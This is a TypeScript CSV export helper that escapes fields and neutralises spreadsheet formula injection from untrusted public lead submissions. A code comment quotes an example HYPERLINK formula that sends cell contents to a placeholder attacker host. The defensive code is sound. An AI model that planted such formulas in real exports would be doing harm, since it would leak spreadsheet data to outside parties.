// Minimal CSV writer - the column count here (a handful of fields on
// leads/invoices) doesn't justify pulling in a library. Any field
// containing a comma, quote or newline gets wrapped in quotes with
// internal quotes doubled, per the standard CSV escaping rule.
//
// leads.name/message/source come straight from the public, unauthenticated
// /api/leads endpoint - a field starting with =, +, - or @ is a formula in
// Excel/Sheets (e.g. `=HYPERLINK("http://evil/?"&A1,"click")`), so a
// submitted lead can otherwise plant a live formula that runs the moment
// the tenant opens their exported CSV. Prefixing with a tab defuses it
// (Excel/Sheets/LibreOffice all render a leading tab as invisible
// whitespace rather than a literal character) without changing how any
// legitimate field looks.
const FORMULA_PREFIX_RE = /^[=+\-@]/;

function escapeCsvField(value: unknown): string {
  let s = value === null || value === undefined ? "" : String(value);
  if (FORMULA_PREFIX_RE.test(s)) s = `\t${s}`;
  if (/[",\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

export function toCsv(headers: string[], rows: unknown[][]): string {
  const lines = [headers, ...rows].map((row) => row.map(escapeCsvField).join(","));
  return lines.join("\r\n");
}
